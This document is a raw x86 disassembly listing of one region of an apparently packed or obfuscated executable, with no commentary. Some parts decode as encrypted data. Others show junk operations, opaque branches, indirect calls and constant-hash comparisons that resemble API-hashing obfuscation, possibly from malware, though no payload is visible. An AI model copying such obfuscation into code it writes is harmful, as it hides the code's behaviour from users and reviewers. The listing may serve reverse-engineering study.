  41d23d:	pop    eax
  41d23e:	inc    esp
  41d23f:	rol    BYTE PTR [edi+0xf2d75c1],cl
  41d245:	pop    es
  41d246:	or     cl,BYTE PTR [ebx-0x16073149]
  41d24c:	sti    
  41d24d:	shr    DWORD PTR [eax],1
  41d24f:	ja     0x41d24a
  41d251:	jno    0x41d218
  41d253:	lea    ebx,[edi+0x17]
  41d256:	xor    edi,ecx
  41d258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d259:	arpl   WORD PTR [edx+edi*2-0x16],si
  41d25d:	xor    BYTE PTR [edx+0x499fb8c2],ah
  41d263:	inc    esi
  41d264:	add    BYTE PTR ds:0x846f4429,dl
  41d26a:	pushf  
  41d26b:	mov    ebx,0xa7735497
  41d270:	imul   esi,ebx,0xefb62eca
  41d276:	dec    edi
  41d277:	jmp    0xe457:0x2ce73349
  41d27e:	lods   eax,DWORD PTR ds:[esi]
  41d27f:	sub    cl,BYTE PTR [edi+ebp*1-0x5b]
  41d283:	add    DWORD PTR [edi+0x42],eax
  41d286:	aas    
  41d287:	or     al,0xd7
  41d289:	ds (bad) 
  41d28b:	imul   ebp,DWORD PTR [eax+0x179e7d9e],0x4f
  41d292:	pop    ebp
  41d293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d294:	mov    al,ds:0xacbbede9
  41d299:	ins    DWORD PTR es:[edi],dx
  41d29a:	test   DWORD PTR [esp+eax*4-0x24180c62],edi
  41d2a1:	dec    edi
  41d2a2:	clc    
  41d2a3:	pop    ebx
  41d2a4:	lock inc esp
  41d2a6:	pop    edx
  41d2a7:	sti    
  41d2a8:	add    bh,BYTE PTR [ebx-0x25]
  41d2ab:	sbb    al,0xee
  41d2ad:	test   BYTE PTR [ecx],ah
  41d2af:	xor    DWORD PTR [eax-0x4f59b9e2],esi
  41d2b5:	sbb    dh,BYTE PTR [edx+0x2d]
  41d2b8:	jge    0x41d23e
  41d2ba:	jp     0x41d2bf
  41d2bc:	xchg   esi,eax
  41d2bd:	or     bh,BYTE PTR [esi+0x7e]
  41d2c0:	cmc    
  41d2c1:	jle    0x41d331
  41d2c3:	cdq    
  41d2c4:	scas   al,BYTE PTR es:[edi]
  41d2c5:	adc    al,0xaf
  41d2c7:	cdq    
  41d2c8:	pusha  
  41d2c9:	lahf   
  41d2ca:	sbb    eax,0x2988d9a7
  41d2cf:	push   ecx
  41d2d0:	xlat   BYTE PTR ds:[ebx]
  41d2d1:	sub    eax,0x23ba4ce9
  41d2d6:	adc    esi,DWORD PTR [ebp-0x60]
  41d2d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2da:	aam    0xc8
  41d2dc:	inc    ecx
  41d2dd:	test   eax,0xc469fc16
  41d2e2:	repnz scas al,BYTE PTR es:[edi]
  41d2e4:	loope  0x41d293
  41d2e6:	xchg   ecx,eax
  41d2e7:	pop    ebp
  41d2e8:	xor    BYTE PTR [esi+0x564c8c68],0x34
  41d2ef:	dec    edx
  41d2f0:	psubb  mm1,mm6
  41d2f3:	retf   0x94dd
  41d2f6:	out    0x12,eax
  41d2f8:	es je  0x41d36a
  41d2fb:	imul   eax,DWORD PTR [ecx],0x24
  41d2fe:	ins    BYTE PTR es:[edi],dx
  41d2ff:	push   ss
  41d300:	ss dec dx
  41d303:	(bad)  
  41d304:	clc    
  41d305:	jecxz  0x41d2a3
  41d307:	xchg   ecx,ecx
  41d309:	ror    BYTE PTR [edx],0x52
  41d30c:	jnp    0x41d38a
  41d30e:	cmp    ah,BYTE PTR [bx]
  41d311:	dec    dh
  41d313:	and    al,0xbb
  41d315:	xor    al,0x46
  41d317:	and    ebp,DWORD PTR [ebx-0x26867ed2]
  41d31d:	and    edi,DWORD PTR [edx-0x354852e1]
  41d323:	mov    ch,0xe5
  41d325:	std    
  41d326:	xor    DWORD PTR [eax],ebx
  41d328:	xor    eax,DWORD PTR [esi]
  41d32a:	mov    cl,0x37
  41d32c:	add    DWORD PTR [eax+0x50],edx
  41d32f:	(bad)  
  41d330:	daa    
  41d331:	jae    0x41d2bf
  41d333:	xchg   edx,eax
  41d334:	xchg   esp,eax
  41d335:	call   0xbe20:0x2aaa4d91
  41d33c:	in     eax,0x6c
  41d33e:	cmp    al,0x9e
  41d340:	jmp    0x1f6a:0xd20b1cf
  41d347:	adc    al,0xda
  41d349:	sti    
  41d34a:	xchg   ebx,eax
  41d34b:	fsubrp st(3),st
  41d34d:	jae    0x41d2fb
  41d34f:	and    eax,0x3d244935
  41d354:	jmp    0xce75968c
  41d359:	cmp    eax,edx
  41d35b:	jne    0x41d369
  41d361:	cmp    ecx,edi
  41d363:	je     0x41d3e3
  41d369:	mov    eax,DWORD PTR [esp+0x30]
  41d36d:	mov    eax,DWORD PTR [esp+0x30]
  41d371:	mov    eax,DWORD PTR [esp+0x30]
  41d375:	mov    ecx,DWORD PTR [esp+0x30]
  41d379:	xor    eax,0xa6069caf
  41d37e:	xor    ecx,0xfffffffe
  41d381:	shr    eax,0x2
  41d384:	shl    ecx,0x1e
  41d387:	or     eax,ecx
  41d389:	xor    ecx,ecx
  41d38b:	shld   ecx,eax,0x2
  41d38f:	shl    eax,0x2
  41d392:	xor    eax,ebx
  41d394:	xor    ecx,esi
  41d396:	cmp    eax,0xcb89b672
  41d39b:	jne    0x41d3a9
  41d3a1:	cmp    ecx,esi
  41d3a3:	je     0x41d427
  41d3a9:	mov    eax,DWORD PTR [esp+0x40]
  41d3ad:	cdq    
  41d3ae:	mov    eax,DWORD PTR [esp+0x40]
  41d3b2:	mov    ecx,edx
  41d3b4:	cdq    
  41d3b5:	shld   edx,eax,0x2
  41d3b9:	shr    ecx,0x1e
  41d3bc:	xor    edi,edi
  41d3be:	shl    eax,0x2
  41d3c1:	or     eax,ecx
  41d3c3:	or     edx,edi
  41d3c5:	mov    ecx,edx
  41d3c7:	mov    edx,DWORD PTR [esp+0x58]
  41d3cb:	xor    eax,ebx
  41d3cd:	xor    ecx,esi
  41d3cf:	mov    esi,DWORD PTR [esp+0x5c]
  41d3d3:	cmp    edx,eax
  41d3d5:	jne    0x41d3e3
  41d3db:	cmp    esi,ecx
  41d3dd:	je     0x41d427
  41d3e3:	push   DWORD PTR ds:0x422398
  41d3e9:	push   DWORD PTR ds:0x42212c
  41d3ef:	mov    eax,ds:0x4222a8
  41d3f4:	mov    eax,DWORD PTR [eax+0x1a4]
  41d3fa:	push   DWORD PTR [eax]
  41d3fc:	mov    eax,DWORD PTR [esp+0x50]
  41d400:	call   eax
  41d402:	mov    ecx,DWORD PTR ds:0x4222a8
  41d408:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41d40e:	mov    DWORD PTR [ecx],eax
  41d410:	mov    eax,ds:0x4222a8
  41d415:	push   0x4
  41d417:	add    eax,0x1dc
  41d41c:	push   eax
  41d41d:	lea    eax,[esp+0x54]
  41d421:	push   eax
  41d422:	call   0x41182a
  41d427:	mov    eax,DWORD PTR [esp+0x4c]
  41d42b:	jmp    0x41d6c1
  41d430:	push   ebx
  41d431:	sub    dh,BYTE PTR [esi-0x48a9482d]
  41d437:	stos   DWORD PTR es:[edi],eax
  41d438:	scas   eax,DWORD PTR es:[edi]
  41d439:	sbb    bh,BYTE PTR [edi]
  41d43b:	jno    0x41d465
  41d43d:	ins    BYTE PTR es:[edi],dx
  41d43e:	and    eax,DWORD PTR [ebp+0x57]
  41d441:	jle    0x41d404
  41d443:	mov    ebx,0xbbbbbfa8
  41d448:	mov    al,0x43
  41d44a:	ins    DWORD PTR es:[edi],dx
  41d44b:	or     esp,edx
  41d44d:	mov    edi,0xbd48d1fd
  41d452:	bound  ecx,QWORD PTR [eax-0x11]
  41d455:	in     al,dx
  41d456:	and    ch,BYTE PTR [ebx+esi*4-0x6e]
  41d45a:	or     eax,0x627167c7
  41d45f:	dec    edi
  41d460:	cmp    eax,0x7d4d6859
  41d465:	or     BYTE PTR [ebp+0x75072910],0xd1
  41d46c:	daa    
  41d46d:	mov    ebp,0xb674702c
  41d472:	adc    BYTE PTR [ebx-0x2b559d0b],0x16
  41d479:	add    BYTE PTR [ecx],0x62
  41d47c:	rcl    ecx,1
  41d47e:	retf   0xb435
  41d481:	lock mov edi,0x134d79cc
  41d487:	ins    DWORD PTR es:[edi],dx
  41d488:	pop    eax
  41d489:	rcl    DWORD PTR [edx-0x66],cl
  41d48c:	xchg   edi,eax
  41d48d:	and    ebx,ebx
  41d48f:	xor    al,0xb7
  41d491:	addr16 enter 0x821f,0x4e
  41d496:	out    0x98,eax
  41d498:	in     eax,0x88
  41d49a:	cli    
  41d49b:	sbb    bh,dl
  41d49d:	and    BYTE PTR [ebx+0x5f6ddd5f],dl
  41d4a3:	not    DWORD PTR [ebp-0x3dbe6999]
  41d4a9:	xchg   esi,eax
  41d4aa:	add    bh,dh
  41d4ac:	dec    esi
  41d4ad:	adc    al,0x60
  41d4af:	or     esp,DWORD PTR [eax+0x30]
  41d4b2:	xchg   esi,eax
  41d4b3:	fisttp WORD PTR [esi+0xa]
  41d4b6:	stos   DWORD PTR es:[edi],eax
  41d4b7:	inc    esi
  41d4b8:	inc    esi
  41d4b9:	icebp  
  41d4ba:	out    dx,al
  41d4bb:	and    cl,BYTE PTR [edi]
  41d4bd:	pop    ss
  41d4be:	fadd   DWORD PTR [edi]
  41d4c0:	mov    ecx,0x395b7216
  41d4c5:	cmp    ebx,DWORD PTR [ebx+esi*2+0x78a84a52]
  41d4cc:	js     0x41d51f
  41d4ce:	outs   dx,BYTE PTR ds:[esi]
  41d4cf:	jg     0x41d4e1
  41d4d1:	retf   0xd97c
  41d4d4:	mov    edi,0x4ece1680
  41d4d9:	pop    es
  41d4da:	loope  0x41d4a3
  41d4dc:	mov    edi,DWORD PTR ds:0x7fb35d56
  41d4e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4e3:	in     eax,dx
  41d4e4:	sub    ebp,ecx
  41d4e6:	fistp  WORD PTR [eax-0x73]
  41d4e9:	inc    esp
  41d4ea:	mov    DWORD PTR [eax],ebx
  41d4ec:	aam    0x4c
  41d4ee:	sbb    DWORD PTR [ebx-0x1016bbcb],ebp
  41d4f4:	dec    ebp
  41d4f5:	xchg   esi,eax
  41d4f6:	cld    
  41d4f7:	ret    
  41d4f8:	push   ecx
  41d4f9:	adc    eax,0xd7165345
  41d4fe:	jo     0x41d544
  41d500:	pop    edi
  41d501:	inc    ebx
  41d502:	xchg   ecx,edx
  41d504:	je     0x41d572
  41d506:	fwait
  41d507:	retf   
  41d508:	sub    DWORD PTR [edx-0x1c7e8635],edi
  41d50e:	mov    edi,0xe81da350
  41d513:	gs icebp 
  41d515:	xchg   ecx,eax
  41d516:	es mov edx,0x4017331c
  41d51c:	cli    
  41d51d:	shl    BYTE PTR [eax-0x11fa8d5a],cl
  41d523:	pop    ebp
  41d524:	and    ah,bh
  41d526:	(bad)  
  41d527:	div    BYTE PTR [ecx+eax*8-0x43]
  41d52b:	pushf  
  41d52c:	xchg   BYTE PTR [edx+edx*4-0x11],bl
  41d530:	add    al,0xba
  41d532:	jno    0x41d572
  41d534:	adc    ebx,eax
  41d536:	cmc    
  41d537:	cs or  ebx,esi
  41d53a:	ss mov ah,0x0
  41d53d:	sbb    eax,0x2984d37c
  41d542:	mov    ebx,0xe9ef0aa2
  41d547:	loope  0x41d55c
  41d549:	pop    edx
  41d54a:	pushf  
  41d54b:	(bad)  
  41d54d:	mov    dh,0xc9
  41d54f:	int3   
  41d550:	aam    0x66
  41d552:	jae    0x41d511
  41d554:	sti    
  41d555:	nop
  41d556:	test   eax,0x71bcf226
  41d55b:	cmp    esp,DWORD PTR [ecx+ebp*4]
  41d55e:	pop    eax
  41d55f:	popf   
  41d560:	lock push edi
  41d562:	rcr    BYTE PTR [edi],0xb2
  41d565:	stos   BYTE PTR es:[edi],al
  41d566:	cmp    al,cl
  41d568:	inc    eax
  41d569:	mov    eax,ds:0x47e52f9a
  41d56e:	jge    0x41d541
  41d570:	call   0x2a4b:0x95ca95a7
  41d577:	cmp    BYTE PTR [ebp+0x5f],cl
  41d57a:	jmp    0x49e7:0x9dfafe4e
  41d581:	sub    ch,BYTE PTR [ebx+0xea6c669]
  41d587:	adc    DWORD PTR [edi-0x43],edi
  41d58a:	jp     0x41d5df
  41d58c:	call   0x4e7f7633
  41d591:	dec    esi
  41d592:	mov    bh,0xb6
  41d594:	ss and eax,0xdff1dde8
  41d59a:	or     DWORD PTR [ebx+ecx*4-0x33b887e5],edi
  41d5a1:	clc    
  41d5a2:	hlt    
  41d5a3:	pop    ds
  41d5a4:	jbe    0x41d5d1
  41d5a6:	(bad)  
  41d5a7:	sar    DWORD PTR [esi-0x2be6c568],cl
  41d5ad:	xchg   edi,eax
  41d5ae:	nop
  41d5af:	fnstcw WORD PTR [esi-0x37447f14]
  41d5b5:	adc    BYTE PTR [esi+0x31],ch
  41d5b8:	mov    ebp,0xb5fde074
  41d5bd:	sahf   
  41d5be:	sub    ecx,DWORD PTR [edx-0x55]
  41d5c1:	mov    ?,WORD PTR [esi]
  41d5c3:	call   0x62ba:0x23c6a2da
  41d5ca:	xchg   ebp,eax
  41d5cb:	or     eax,0xaa30e222
  41d5d0:	out    dx,eax
  41d5d1:	adc    dh,al
  41d5d3:	push   ebx
  41d5d4:	stos   BYTE PTR es:[edi],al
  41d5d5:	loop   0x41d563
  41d5d7:	xchg   esi,eax
  41d5d8:	dec    DWORD PTR [edi-0x5b]
  41d5db:	(bad)  
  41d5dc:	addr16 push es
  41d5de:	inc    ebx
  41d5df:	cmp    edi,DWORD PTR [ebp+0x60d6f0a1]
  41d5e5:	aaa    
  41d5e6:	pop    ebp
  41d5e7:	jle    0x41d62b
  41d5e9:	in     eax,0xfb
  41d5eb:	jmp    0x41d625
  41d5ed:	xchg   edi,eax
  41d5ee:	sbb    al,0xc
  41d5f0:	push   0x33
  41d5f2:	pop    esp
  41d5f3:	mov    esp,0x2159d53e
  41d5f8:	retf   0xcaf3
  41d5fb:	test   DWORD PTR [ebx+edx*2],edx
  41d5fe:	outs   dx,DWORD PTR ds:[esi]
  41d5ff:	or     ebp,esi
  41d601:	push   ebp
  41d602:	out    0x9b,eax
  41d604:	sbb    eax,0xf44a0046
  41d609:	frstor [eax+0x1a316355]
  41d60f:	adc    al,BYTE PTR [ebp-0x5d46c951]
  41d615:	mov    eax,ds:0x91945fd8
  41d61a:	mov    DWORD PTR [esp+ebp*2+0x72],ebx
  41d61e:	cmp    al,0x9e
  41d620:	enter  0xb913,0x8c
  41d624:	mov    bh,0xd
  41d626:	xchg   ecx,eax
  41d627:	mov    ds:0xdcb6d422,al
  41d62c:	push   edi
  41d62d:	movhps QWORD PTR [eax-0x4502f890],xmm2
  41d634:	jb     0x41d6b0
  41d636:	lods   eax,DWORD PTR gs:[esi]
  41d638:	jmp    0xcbd94532
  41d63d:	pop    ebx
  41d63e:	cmp    bl,BYTE PTR [edx+0x7b01a9fa]
  41d644:	adc    bl,BYTE PTR [edi-0x6a]
  41d647:	xor    edi,DWORD PTR [eax+0x65eb2192]
  41d64d:	push   edx
  41d64e:	xchg   esp,eax
  41d64f:	outs   dx,DWORD PTR ds:[esi]
  41d650:	push   ebx
  41d651:	idiv   BYTE PTR [ecx-0x637eba4e]
  41d657:	push   ss
  41d658:	push   es
  41d659:	addr16 loop 0x41d693
  41d65c:	push   0x71
  41d65e:	xchg   ebp,eax
  41d65f:	pop    edx
  41d660:	sbb    ah,BYTE PTR [esi+eax*2+0xaba76ed]
  41d667:	ret    
  41d668:	mov    esp,0x5add659c
  41d66d:	in     al,dx
  41d66e:	pop    ebx
  41d66f:	hlt    
  41d670:	test   bl,ch
  41d672:	loopne 0x41d643
  41d674:	inc    edx
  41d675:	call   0x9697:0x88cf31c1
  41d67c:	add    DWORD PTR [edx-0x7e8c630a],esp
  41d682:	lods   al,BYTE PTR ds:[esi]
  41d683:	mov    DWORD PTR [edi],eax
  41d685:	mov    ds:0x1aeaf187,al
  41d68a:	cmp    dl,dl
  41d68c:	ins    DWORD PTR es:[edi],dx
  41d68d:	jb     0x41d619
  41d68f:	jb     0x41d6f9
  41d691:	jno    0x41d62a
  41d693:	outs   dx,DWORD PTR ds:[esi]
  41d694:	mov    ah,0xd8
  41d696:	mov    ebx,DWORD PTR [edi+esi*8]
  41d699:	aaa    
  41d69a:	loop   0x41d61e
  41d69c:	dec    ebx
  41d69d:	sub    ecx,ecx
  41d69f:	loopne 0x41d6d8
  41d6a1:	das    
  41d6a2:	dec    ebx
  41d6a3:	retf   
  41d6a4:	jecxz  0x41d676
  41d6a6:	data16 loop 0x41d6e5
  41d6a9:	adc    ch,cl
  41d6ab:	idiv   DWORD PTR [eax-0x76]
  41d6ae:	sbb    DWORD PTR [eax+ebx*4+0x8],ecx
  41d6b2:	or     ch,ah
  41d6b4:	es dec ecx
  41d6b6:	xchg   esp,eax
  41d6b7:	loop   0x41d70d
  41d6b9:	mov    al,0xa
  41d6bb:	push   cs
  41d6bc:	stos   BYTE PTR es:[edi],al
  41d6bd:	inc    edx
  41d6be:	or     BYTE PTR [ecx],ah
  41d6c0:	sahf   
  41d6c1:	mov    eax,DWORD PTR [eax]
  41d6c3:	pop    edi
  41d6c4:	pop    esi
  41d6c5:	pop    ebx
  41d6c6:	mov    esp,ebp
  41d6c8:	pop    ebp
  41d6c9:	ret    0xc
  41d6cc:	push   ebp
  41d6cd:	mov    ebp,esp
  41d6cf:	sub    esp,0x1b0
  41d6d5:	xor    eax,eax
  41d6d7:	push   ebx
  41d6d8:	push   esi
  41d6d9:	movzx  eax,BYTE PTR ds:0x4282c5
  41d6e0:	add    eax,DWORD PTR ds:0x428229
  41d6e6:	mov    ds:0x4282c5,eax
  41d6eb:	push   edi
  41d6ec:	mov    DWORD PTR [ebp-0x3c],0x5e9e
  41d6f3:	cmp    DWORD PTR ds:0x428275,0x0
  41d6fa:	mov    DWORD PTR ds:0x4282c1,ecx
  41d700:	mov    DWORD PTR ds:0x428241,0x495a
  41d70a:	mov    ecx,0x785
  41d70f:	jmp    0x41d75d
  41d714:	mov    DWORD PTR ds:0x4282cd,edi
  41d71a:	mov    DWORD PTR ds:0x42827d,edi
  41d720:	cmp    DWORD PTR ds:0x428275,0x0
  41d727:	jg     0x41d74e
  41d72d:	call   DWORD PTR ds:0x428a2c
  41d733:	sub    esi,0xf8
  41d739:	movzx  esi,WORD PTR ds:0x428241
  41d740:	or     DWORD PTR ds:0x428211,esi
  41d746:	adc    ecx,ecx
  41d748:	add    DWORD PTR ds:0x4282c1,ebx
  41d74e:	sbb    ecx,esi
  41d750:	movzx  esi,WORD PTR ds:0x42821d
  41d757:	add    DWORD PTR ds:0x4281a9,esi
  41d75d:	mov    DWORD PTR [ebp-0x8],0x4157
  41d764:	mov    esi,DWORD PTR ds:0x4282c1
  41d76a:	add    esi,DWORD PTR ds:0x428241
  41d770:	mov    DWORD PTR ds:0x4282c1,esi
  41d776:	mov    eax,DWORD PTR [ebp-0x8]
  41d779:	cmp    DWORD PTR ds:0x428271,0x0
  41d780:	mov    DWORD PTR ds:0x428229,0x5c24
  41d78a:	mov    esi,0x192d
  41d78f:	mov    DWORD PTR ds:0x428285,edi
  41d795:	jmp    0x41d7e5
  41d79a:	mov    DWORD PTR ds:0x428205,edi
  41d7a0:	cmp    DWORD PTR ds:0x428271,0x0
  41d7a7:	jae    0x41d7cb
  41d7ad:	push   0x42822d
  41d7b2:	push   0x814d
  41d7b7:	call   DWORD PTR ds:0x428a30
  41d7bd:	mov    esi,DWORD PTR ds:0x428211
  41d7c3:	xor    DWORD PTR ds:0x4282c9,esi
  41d7c9:	xor    esi,ecx
  41d7cb:	sbb    ecx,DWORD PTR ds:0x42821d
  41d7d1:	xor    ecx,ecx
  41d7d3:	or     ecx,DWORD PTR ds:0x42819d
  41d7d9:	or     DWORD PTR ds:0x428271,ecx
  41d7df:	sub    DWORD PTR ds:0x4282c5,edx
  41d7e5:	and    eax,0x154d
  41d7ea:	add    esi,ecx
  41d7ec:	add    eax,DWORD PTR [ebp-0x3c]
  41d7ef:	cmp    DWORD PTR ds:0x4282c9,0x0
  41d7f6:	mov    esi,0x2aa4
  41d7fb:	mov    esi,0x72de
  41d800:	mov    ecx,0x47f7
  41d805:	movzx  esi,WORD PTR ds:0x4281b1
  41d80c:	jmp    0x41d88b
  41d811:	mov    DWORD PTR ds:0x42820d,0x4afb
  41d81b:	mov    DWORD PTR ds:0x428279,0x1811
  41d825:	cmp    DWORD PTR ds:0x4282c9,0x0
  41d82c:	jbe    0x41d873
  41d832:	push   0x4dc7
  41d837:	push   DWORD PTR [ebp-0x18]
  41d83a:	push   0x6718
  41d83f:	push   DWORD PTR [ebp-0xc]
  41d842:	call   DWORD PTR ds:0x428a34
  41d848:	mov    ecx,DWORD PTR ds:0x42827d
  41d84e:	xor    DWORD PTR ds:0x42822d,ecx
  41d854:	sbb    esi,esi
  41d856:	mov    ecx,DWORD PTR ds:0x428239
  41d85c:	sub    DWORD PTR ds:0x4281b1,ecx
  41d862:	mov    ecx,DWORD PTR ds:0x428299
  41d868:	mov    esi,DWORD PTR ds:0x4282ad
  41d86e:	sub    esi,ecx
  41d870:	and    ecx,DWORD PTR [ecx+esi*1]
  41d873:	sbb    DWORD PTR ds:0x428231,edi
  41d879:	xor    ecx,ecx
  41d87b:	add    DWORD PTR ds:0x42821d,0x40b7
  41d885:	add    esi,0x63d5
  41d88b:	mov    ecx,DWORD PTR ds:0x4224e4
  41d891:	xor    edx,edx
  41d893:	div    ecx
  41d895:	cmp    DWORD PTR ds:0x4282c9,0x0
  41d89c:	mov    esi,DWORD PTR ds:0x4282c1
  41d8a2:	mov    ecx,DWORD PTR ds:0x42822d
  41d8a8:	mov    DWORD PTR ds:0x428209,0x36df
  41d8b2:	jmp    0x41d920
  41d8b7:	mov    DWORD PTR ds:0x428199,ebx
  41d8bd:	mov    DWORD PTR ds:0x428225,0x1738
  41d8c7:	cmp    DWORD PTR ds:0x4282c9,0x0
  41d8ce:	jge    0x41d908
  41d8d4:	push   DWORD PTR [ebp-0x10]
  41d8d7:	push   0x4a92
  41d8dc:	call   DWORD PTR ds:0x428a38
  41d8e2:	xor    esi,DWORD PTR ds:0x428195
  41d8e8:	add    DWORD PTR ds:0x42827d,edx
  41d8ee:	mov    esi,DWORD PTR ds:0x4281c5
  41d8f4:	xor    ecx,ecx
  41d8f6:	or     ecx,DWORD PTR ds:0x4282a9
  41d8fc:	sub    ecx,esi
  41d8fe:	imul   esi,DWORD PTR [esi+ecx*1]
  41d902:	sbb    esi,0x66b
  41d908:	or     DWORD PTR ds:0x42822d,edx
  41d90e:	sub    DWORD PTR ds:0x4282b1,edi
  41d914:	sub    DWORD PTR ds:0x428289,0x42821d
  41d91e:	not    esi
  41d920:	mov    ecx,DWORD PTR ds:0x4224e0
  41d926:	xor    eax,ecx
  41d928:	mov    DWORD PTR ds:0x428275,0x7ef0
  41d932:	and    eax,0x3048
  41d937:	sbb    esi,0xec8
  41d93d:	sub    eax,0x3040
  41d942:	mov    DWORD PTR [ebp-0x54],eax
  41d945:	cmp    DWORD PTR ds:0x428239,0x0
  41d94c:	mov    DWORD PTR ds:0x428195,0x70c7
  41d956:	mov    esi,0x943
  41d95b:	movzx  esi,BYTE PTR ds:0x4281a5
  41d962:	jmp    0x41d9c8
  41d967:	mov    DWORD PTR ds:0x4282d1,0x473e
  41d971:	mov    eax,ds:0x4282c1
  41d976:	cmp    DWORD PTR ds:0x428239,0x0
  41d97d:	jae    0x41d9b0
  41d983:	push   DWORD PTR [ebp-0xc]
  41d986:	push   DWORD PTR [ebp-0xc]
  41d989:	push   DWORD PTR [ebp-0x14]
  41d98c:	call   DWORD PTR ds:0x428a3c
  41d992:	sub    DWORD PTR ds:0x428279,0x1571
  41d99c:	neg    DWORD PTR ds:0x42826d
  41d9a2:	mov    ecx,DWORD PTR ds:0x42824d
  41d9a8:	mov    ecx,DWORD PTR [ecx]
  41d9aa:	sbb    DWORD PTR ds:0x4282b9,ecx
  41d9b0:	and    DWORD PTR ds:0x4281ad,ebx
  41d9b6:	add    DWORD PTR ds:0x4282bd,ecx
  41d9bc:	mov    ecx,DWORD PTR ds:0x428281
  41d9c2:	or     DWORD PTR ds:0x42823d,ecx
  41d9c8:	mov    DWORD PTR [ebp-0x38],0xe8b
  41d9cf:	mov    DWORD PTR [ebp-0x14],0x7ab1
  41d9d6:	and    ecx,DWORD PTR ds:0x42819d
  41d9dc:	mov    eax,DWORD PTR [ebp-0x14]
  41d9df:	mov    ecx,DWORD PTR ds:0x4281c5
  41d9e5:	mov    esi,DWORD PTR ds:0x428299
  41d9eb:	sub    esi,ecx
  41d9ed:	add    ecx,DWORD PTR [ecx+esi*1]
  41d9f0:	xor    eax,0x6556
  41d9f5:	imul   eax,eax,0x4c34
  41d9fb:	mov    ecx,DWORD PTR [ebp-0x38]
  41d9fe:	mov    esi,DWORD PTR ds:0x42822d
  41da04:	sub    DWORD PTR ds:0x428231,esi
  41da0a:	sub    eax,ecx
  41da0c:	xor    eax,0x97f0061
  41da11:	cmp    DWORD PTR ds:0x428239,0x0
  41da18:	mov    DWORD PTR ds:0x428201,0x3683
  41da22:	mov    DWORD PTR ds:0x428205,0x6dc8
  41da2c:	mov    DWORD PTR ds:0x4281b1,0x2e22
  41da36:	not    ecx
  41da38:	jmp    0x41da9a
  41da3d:	mov    DWORD PTR ds:0x4281a9,0x601a
  41da47:	cmp    DWORD PTR ds:0x428239,0x0
  41da4e:	jge    0x41da87
  41da54:	push   0x427fd4
  41da59:	push   0x649b
  41da5e:	push   DWORD PTR [ebp-0xc]
  41da61:	push   0x6ab2
  41da66:	push   0x8eac
  41da6b:	call   DWORD PTR ds:0x428a40
  41da71:	neg    esi
  41da73:	xor    DWORD PTR ds:0x42826d,0x57cb
  41da7d:	sbb    DWORD PTR ds:0x428239,0x1abb
  41da87:	adc    ecx,ecx
  41da89:	and    DWORD PTR ds:0x428219,0x2686
  41da93:	inc    esi
  41da94:	sub    ecx,0x7dd4
  41da9a:	mov    DWORD PTR [ebp-0x8c],eax
  41daa0:	neg    eax
  41daa2:	mov    DWORD PTR [ebp-0x2c],0x1a37
  41daa9:	mov    DWORD PTR [ebp-0x24],0xf32
  41dab0:	mov    DWORD PTR [ebp-0x34],0x4508
  41dab7:	mov    eax,DWORD PTR [ebp-0x24]
  41daba:	sbb    DWORD PTR ds:0x4282b5,0x728b
  41dac4:	mov    ecx,DWORD PTR [ebp-0x34]
  41dac7:	xor    eax,ecx
  41dac9:	mov    ecx,DWORD PTR ds:0x4224f8
  41dacf:	sub    eax,ecx
  41dad1:	mov    ecx,DWORD PTR ds:0x4224f4
  41dad7:	xor    DWORD PTR ds:0x4282c5,ebx
  41dadd:	xor    eax,ecx
  41dadf:	cmp    DWORD PTR ds:0x428289,0x0
  41dae6:	mov    DWORD PTR ds:0x4281b1,0x7b63
  41daf0:	mov    esi,0x7574
  41daf5:	mov    esi,0x30e2
  41dafa:	jmp    0x41db5c
  41daff:	mov    DWORD PTR ds:0x428215,0x1a1e
  41db09:	cmp    DWORD PTR ds:0x428289,0x0
  41db10:	jge    0x41db4a
  41db16:	push   DWORD PTR [ebp-0x10]
  41db19:	push   DWORD PTR [ebp-0x20]
  41db1c:	push   DWORD PTR [ebp-0x18]
  41db1f:	push   0x3f84
  41db24:	push   0x4280cb
  41db29:	push   0x5556
  41db2e:	call   DWORD PTR ds:0x4289b0
  41db34:	sbb    esi,esi
  41db36:	sub    DWORD PTR ds:0x428221,0x428199
  41db40:	and    DWORD PTR ds:0x428235,0x4281a5
  41db4a:	sbb    DWORD PTR ds:0x42821d,ecx
  41db50:	or     DWORD PTR ds:0x428241,edx
  41db56:	xor    DWORD PTR ds:0x42821d,edx
  41db5c:	mov    ecx,DWORD PTR ds:0x4224f0
  41db62:	imul   eax,ecx
  41db65:	sub    esi,esi
  41db67:	mov    ecx,0x864062
  41db6c:	sub    ecx,eax
  41db6e:	adc    DWORD PTR ds:0x428279,0x428241
  41db78:	mov    eax,ds:0x4224ec
  41db7d:	mov    DWORD PTR ds:0x4281a5,0x1c15
  41db87:	xor    eax,0x3908
  41db8c:	mov    esi,DWORD PTR ds:0x4224e8
  41db92:	not    DWORD PTR ds:0x428195
  41db98:	xor    edx,edx
  41db9a:	inc    DWORD PTR ds:0x42819d
  41dba0:	jmp    0x41de3d
  41dba5:	mov    BYTE PTR [edx+0x5c10cd0a],al
  41dbab:	pushf  
  41dbac:	xchg   bl,ah
  41dbae:	add    ebx,DWORD PTR [edi-0xa62c505]
  41dbb4:	cmp    eax,DWORD PTR [eax+ecx*4-0x3f]
  41dbb8:	mov    ebx,0xbbbbbfb2
  41dbbd:	sbb    DWORD PTR [eax],ecx
  41dbbf:	nop
  41dbc0:	add    ebp,DWORD PTR [edx]
  41dbc2:	jae    0x41db7f
  41dbc4:	sub    al,0xaa
  41dbc6:	mov    dh,0xc8
  41dbc8:	lea    ebx,[esi]
  41dbca:	adc    al,0x3d
  41dbcc:	mov    ebp,0xba62d3d
  41dbd1:	les    ecx,FWORD PTR [esi-0x63e0fa32]
  41dbd7:	adc    al,0x90
  41dbd9:	pop    ss
  41dbda:	call   FWORD PTR [esi]
  41dbdc:	dec    edx
  41dbdd:	mov    DWORD PTR [edi],0x44c138c7
  41dbe3:	or     eax,0xd37578ca
  41dbe8:	pushf  
  41dbe9:	sbb    eax,0x9256bde1
  41dbee:	pushf  
  41dbef:	push   cs
  41dbf0:	cwde   
  41dbf1:	je     0x41dbca
  41dbf3:	and    BYTE PTR [edi],ah
  41dbf5:	stos   BYTE PTR es:[edi],al
  41dbf6:	scas   al,BYTE PTR es:[edi]
  41dbf7:	into   
